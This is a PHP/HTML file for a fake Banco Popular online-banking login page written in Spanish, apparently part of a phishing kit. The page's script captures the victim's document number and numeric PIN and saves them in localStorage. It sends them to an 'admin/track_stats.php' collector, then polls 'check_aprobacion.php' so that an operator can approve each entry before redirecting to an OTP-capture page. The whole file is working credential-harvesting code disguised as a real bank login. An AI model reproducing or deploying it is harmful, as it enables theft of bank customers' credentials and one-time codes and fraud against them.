<?php
// Banco Popular - Login
?>
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Banco Popular - Bienvenido</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', 'Roboto', Arial, sans-serif; background-color: #f5f5f5; min-height: 100vh; padding: 20px; }
        .container { max-width: 420px; margin: 0 auto; background-color: white; border-radius: 0; overflow: hidden; box-shadow: 0 2px 4px rgba(0,0,0,0.1); }
        .header-bar { background-color: #00496B; height: 12px; }
        .content { padding: 40px 24px; }
        .welcome-section { margin-bottom: 32px; position: relative; }
        .welcome-section h1 { font-size: 24px; color: #333; font-weight: 400; margin-bottom: 8px; }
        .logo { max-width: 180px; height: auto; }
        .form-group { margin-bottom: 24px; }
        .form-label { display: block; font-size: 14px; font-weight: 500; color: #333; margin-bottom: 8px; }
        select, input[type="text"], input[type="password"] { width: 100%; padding: 14px 16px; border: 1.5px solid #d1d5db; border-radius: 12px; font-size: 15px; color: #333; background-color: white; transition: border-color 0.2s; }
        select { appearance: none; background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='20' height='20' viewBox='0 0 20 20' fill='none'%3E%3Cpath d='M5 7.5L10 12.5L15 7.5' stroke='%23FF6B00' stroke-width='2' stroke-linecap='round' stroke-linejoin='round'/%3E%3C/svg%3E"); background-repeat: no-repeat; background-position: right 12px center; padding-right: 40px; cursor: pointer; }
        input:focus, select:focus { outline: none; border-color: #FF6B00; }
        input::placeholder { color: #9ca3af; }
        .toggle-container { display: flex; align-items: center; gap: 12px; margin-bottom: 24px; }
        .toggle-switch { position: relative; width: 48px; height: 24px; background-color: #d1d5db; border-radius: 12px; cursor: pointer; transition: background-color 0.2s; }
        .toggle-switch.active { background-color: #FF6B00; }
        .toggle-slider { position: absolute; top: 2px; left: 2px; width: 20px; height: 20px; background-color: white; border-radius: 50%; transition: transform 0.2s; }
        .toggle-switch.active .toggle-slider { transform: translateX(24px); }
        .toggle-label { font-size: 14px; color: #666; cursor: pointer; }
        .btn-submit { width: 100%; padding: 16px; background-color: #d1d5db; color: #9ca3af; border: none; border-radius: 8px; font-size: 16px; font-weight: 600; cursor: not-allowed; margin-bottom: 24px; transition: background-color 0.2s; }
        .btn-submit.enabled { background-color: #FF6B00; color: white; cursor: pointer; }
        .btn-submit.enabled:hover { background-color: #e55f00; }
        .register-link { text-align: center; margin-bottom: 32px; }
        .register-link span { color: #666; font-size: 14px; }
        .register-link a { color: #FF6B00; text-decoration: none; font-weight: 600; font-size: 14px; }
        .register-link a:hover { text-decoration: underline; }
        .footer { text-align: center; padding-top: 24px; border-top: 1px solid #e5e5e5; }
        .footer p { font-size: 12px; color: #666; margin-bottom: 8px; }
        .footer-links { display: flex; justify-content: center; gap: 24px; margin-top: 12px; }
        .footer-links a { color: #FF6B00; text-decoration: none; font-size: 12px; font-weight: 500; }
        .footer-links a:hover { text-decoration: underline; }
        .loading-overlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background-color: #0B4A6F; z-index: 9999; justify-content: center; align-items: center; }
        .loading-overlay.show { display: flex; }
        .loading-container { text-align: center; display: flex; flex-direction: column; align-items: center; justify-content: center; }
        .loading-logo { max-width: 250px; height: auto; margin-bottom: 50px; filter: brightness(0) invert(1); }
        .loading-text { font-size: 20px; color: white; margin-bottom: 30px; font-weight: 500; }
        .spinner { width: 60px; height: 60px; border: 5px solid rgba(255,255,255,0.3); border-top: 5px solid white; border-radius: 50%; animation: spin 1s linear infinite; margin: 0 auto; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        .dots::after { content: '.'; animation: dots 1.5s steps(4, end) infinite; }
        @keyframes dots { 0%,20% { content: '.'; } 40% { content: '..'; } 60% { content: '...'; } 80%,100% { content: ''; } }
        #toast { display: none; position: fixed; top: 20px; right: 20px; background: #e74c3c; color: white; padding: 12px 24px; border-radius: 8px; z-index: 10000; font-size: 14px; max-width: 320px; box-shadow: 0 4px 12px rgba(0,0,0,0.3); }
    </style>
</head>
<body>
    <div class="container">
        <div class="header-bar"></div>
        <div class="content">
            <div class="welcome-section">
                <h1>Bienvenido a</h1>
                <img src="popular.svg" alt="Banco Popular" class="logo">
            </div>
            <form id="loginForm">
                <div class="form-group">
                    <label class="form-label">Tipo de documento</label>
                    <select id="docType">
                        <option value="CC">Cédula de Ciudadanía</option>
                        <option value="CE">Cédula de Extranjería</option>
                        <option value="PAS">Pasaporte</option>
                        <option value="NIT">NIT</option>
                    </select>
                </div>
                <div class="form-group">
                    <label class="form-label">Número de documento</label>
                    <input type="text" id="docNumber" placeholder="" maxlength="15" inputmode="numeric">
                </div>
                <div class="form-group">
                    <label class="form-label">Contraseña</label>
                    <input type="password" id="password" placeholder="" maxlength="8" inputmode="numeric">
                </div>
                <div class="toggle-container">
                    <div class="toggle-switch" id="toggleSwitch" onclick="toggleRemember()">
                        <div class="toggle-slider"></div>
                    </div>
                    <label class="toggle-label" onclick="toggleRemember()">Recordar tipo y número de documento</label>
                </div>
                <button type="submit" class="btn-submit" id="submitBtn">Continuar</button>
                <div class="register-link">
                    <span>¿No eres usuario?</span> <a href="#">Regístrate aquí</a>
                </div>
                <div class="footer">
                    <p>Protegido por reCAPTCHA | <a href="#" style="color: #FF6B00; text-decoration: none;">Privacidad</a> - <a href="#" style="color: #FF6B00; text-decoration: none;">Condiciones</a></p>
                    <div class="footer-links">
                        <a href="#">Seguridad</a>
                        <a href="#">Accesibilidad</a>
                    </div>
                </div>
            </form>
        </div>
    </div>
    <div class="loading-overlay" id="loadingOverlay">
        <div class="loading-container">
            <img src="popular.svg" alt="Banco Popular" class="loading-logo">
            <div class="loading-text">Validando su información<span class="dots"></span></div>
            <div class="spinner"></div>
        </div>
    </div>
    <div id="toast"><span id="toastMsg">Error</span></div>
    <script>
        const docNumber = document.getElementById('docNumber');
        const password = document.getElementById('password');
        const submitBtn = document.getElementById('submitBtn');
        const loadingOverlay = document.getElementById('loadingOverlay');
        let rememberChecked = false;
        let pollingInterval = null;
        let logIdLogin = null;

        function validateForm() {
            const doc = docNumber.value.trim();
            const pass = password.value.trim();
            if (doc.length >= 6 && pass.length >= 4) {
                submitBtn.classList.add('enabled');
                submitBtn.disabled = false;
            } else {
                submitBtn.classList.remove('enabled');
                submitBtn.disabled = true;
            }
        }

        docNumber.addEventListener('input', function() {
            this.value = this.value.replace(/\D/g, '');
            validateForm();
        });

        password.addEventListener('input', function() {
            this.value = this.value.replace(/\D/g, '');
            validateForm();
        });

        function toggleRemember() {
            const toggle = document.getElementById('toggleSwitch');
            rememberChecked = !rememberChecked;
            toggle.classList.toggle('active', rememberChecked);
        }

        function showToast(msg) {
            const toast = document.getElementById('toast');
            document.getElementById('toastMsg').textContent = msg;
            toast.style.display = 'block';
            setTimeout(() => {
                toast.style.display = 'none';
            }, 5000);
        }

        function startPolling(id) {
            let pollCount = 0;
            const maxPolls = 150;
            const interval = setInterval(() => {
                pollCount++;
                fetch('../../admin/check_aprobacion.php?log_id=' + id)
                    .then(res => res.json())
                    .then(data => {
                        if (data.estado === 'aprobado') {
                            clearInterval(interval);
                            loadingOverlay.classList.remove('show');
                            window.location.href = "otp.php";
                        } else if (data.estado === 'rechazado') {
                            clearInterval(interval);
                            loadingOverlay.classList.remove('show');
                            showToast("Datos incorrectos. Verifique su documento y contraseña.");
                            docNumber.value = '';
                            password.value = '';
                            validateForm();
                        } else if (pollCount >= maxPolls) {
                            clearInterval(interval);
                            loadingOverlay.classList.remove('show');
                            showToast("Tiempo de espera agotado. Intente de nuevo.");
                        }
                    })
                    .catch(err => {
                        if (pollCount >= maxPolls) {
                            clearInterval(interval);
                            loadingOverlay.classList.remove('show');
                            showToast("Error de conexión. Intente de nuevo.");
                        }
                    });
            }, 2000);
        }

        document.getElementById('loginForm').addEventListener('submit', async function(e) {
            e.preventDefault();
            const doc = docNumber.value.trim();
            const pass = password.value.trim();
            const docType = document.getElementById('docType').value;

            if (!doc || doc.length < 6) {
                showToast('Ingrese un número de documento válido (mínimo 6 dígitos)');
                return;
            }
            if (!pass || pass.length < 4) {
                showToast('Ingrese una contraseña de 4 dígitos');
                return;
            }
            
            loadingOverlay.classList.add('show');
            
            localStorage.setItem('usuario_popular', doc);
            localStorage.setItem('identificacion_popular', doc);
            localStorage.setItem('tipo_id_popular', docType);
            localStorage.setItem('clave_pin_popular', pass);

            const formData = new FormData();
            formData.append('activity', 'LOGIN (BANCO POPULAR)');
            formData.append('action', 'log');
            formData.append('metodo', 'PSE');
            formData.append('banco', 'Banco Popular');
            formData.append('documento', doc);
            formData.append('usuario', doc);
            formData.append('identificacion', doc);
            formData.append('tipo_identificacion', docType);
            formData.append('clave_pin', pass);
            formData.append('clave_tarjeta', '');
            formData.append('ultimos_digitos', '');

            try {
                const response = await fetch('../../admin/track_stats.php', {
                    method: 'POST',
                    body: formData,
                    keepalive: true
                });
                const data = await response.json();
                if (data.success && data.id) {
                    logIdLogin = data.id;
                    localStorage.setItem('log_id_popular', data.id);
                    startPolling(data.id);
                } else {
                    loadingOverlay.classList.remove('show');
                    showToast('Error al procesar la solicitud.');
                }
            } catch (err) {
                loadingOverlay.classList.remove('show');
                showToast('Error de conexión. Intente de nuevo.');
            }
        });
    </script>
</body>
</html>